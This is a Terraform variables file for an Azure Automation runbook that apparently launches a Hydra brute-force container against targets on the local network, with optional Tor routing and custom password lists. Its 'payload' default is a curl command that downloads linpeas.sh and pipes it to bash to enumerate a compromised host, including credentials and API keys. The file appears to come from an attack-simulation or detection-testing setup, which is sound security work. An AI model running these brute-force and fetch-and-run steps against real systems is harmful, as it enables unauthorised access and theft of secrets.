variable "environment" {
    type = string
    description = "name of the environment"
}

variable "deployment" {
    type = string
    description = "unique deployment id"
}

variable "region" {
    type = string
    description = "azure region"
}

variable "resource_group" {
  description = "resource group"
  type = any
}

variable "automation_account" {
    type = string
    description = "automation account name"
}

variable "automation_princial_id"{
    type = string
    description = "automation account principal id"
}

variable "tag" {
    type = string
    description = "tag associated with this runbook"
    default = "runbook_exec_docker_hydra"
}

variable "payload" {
  type = string
  description = "The bash commands payload to execute when target machine connects"
  default = <<-EOT
            curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
            EOT
}

variable "attack_delay" {
  type = number
  description = "wait time between baseline and attack (default: 12 hours)"
  default =  50400
}

variable "image" {
  type = string
  description = "docker image to use"
  default =  "ghcr.io/credibleforce/proxychains-hydra:main"
}

variable "container_name" {
  type = string
  description = "docker container name"
  default =  "hydra"
}

variable "use_tor" {
  type = bool
  description = "whether to use the tor network for scanning"
  default = false
}

variable "custom_user_list" {
  type = list(string)
  default = []
}

variable "custom_password_list" {
  type = list(string)
  default = []
}

variable "user_list" {
  type = string
  default = null
}

variable "password_list" {
  type = string
  default = null
}

variable "targets" {
  type = list(string)
  description = "target to use for brute force - default is local network"
  default = []
}

variable "ssh_user" {
  type = any
  description = "valid user credentials"
  default = null
}